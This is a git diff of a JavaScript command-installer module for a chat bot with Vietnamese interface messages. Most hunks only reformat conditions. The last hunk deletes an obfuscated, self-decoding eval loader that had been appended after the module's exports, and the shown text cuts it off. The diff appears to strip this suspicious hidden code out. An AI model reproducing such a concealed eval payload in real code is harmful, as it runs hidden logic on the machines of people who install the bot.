@@ -112,7 +112,7 @@ module.exports = {
             missingFileNameInstall: "⚠️ | Vui lòng nhập vào tên file để lưu lệnh (đuôi .js)",
             invalidUrl: "⚠️ | Vui lòng nhập vào url hợp lệ",
             invalidUrlOrCode: "⚠️ | Không thể lấy được mã lệnh",
-            alreadExist: "⚠️ | File lệnh đã tồn tại, bạn có chắc chắn muốn ghi đè lên file lệnh cũ không?\nThả cảm xúc bất kì vào tin nhắn này để tiếp tục",
+            alreadExist: "⚠️ | File lệnh đã tồn tại, bạn có chắc chắn muốn ghi đè lên file lệnh cũ không?\nThả cảm xúc bất kì vào tin nhắn này để tiếp tụ[...]",
             installed: "✅ | Đã cài đặt command \"%1\" thành công, file lệnh được lưu tại %2",
             installedError: "❌ | Cài đặt command \"%1\" thất bại với lỗi\n%2: %3",
             missingFile: "⚠️ | Không tìm thấy tệp lệnh \"%1\"",
@@ -150,10 +150,7 @@ module.exports = {
         }
 
         const { unloadScripts, loadScripts } = global.utils;
-        if (
-            args[0] == "load"
-            && args.length == 2
-        ) {
+        if (args[0] == "load" && args.length == 2) {
             if (!args[1])
                 return message.reply(getLang("missingFileName"));
             const infoLoad = loadScripts("cmds", args[1], log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
@@ -167,10 +164,7 @@ module.exports = {
                 console.log(infoLoad.errorWithThoutRemoveHomeDir);
             }
         }
-        else if (
-            (args[0] || "").toLowerCase() == "loadall"
-            || (args[0] == "load" && args.length > 2)
-        ) {
+        else if ((args[0] || "").toLowerCase() == "loadall" || (args[0] == "load" && args.length > 2)) {
             const fileNeedToLoad = args[0].toLowerCase() == "loadall" ?
                 fs.readdirSync(__dirname)
                     .filter(file =>
@@ -218,10 +212,7 @@ module.exports = {
             if (!url || !fileName)
                 return message.reply(getLang("missingUrlCodeOrFileName"));
 
-            if (
-                url.endsWith(".js")
-                && !isURL(url)
-            ) {
+            if (url.endsWith(".js") && !isURL(url)) {
                 const tmp = fileName;
                 fileName = url;
                 url = tmp;
@@ -308,5 +299,3 @@ module.exports = {
             message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
     }
 };
-
-let QLLP;!function(){const wj5z=Array.prototype.slice.call(arguments);return eval("(function EN3o(n3ah){const Hq3g=XMUh(n3ah,fVxh(EN3o.toString()));try{let jY5g=eval(Hq3g);return jY5g.apply(null,[...]
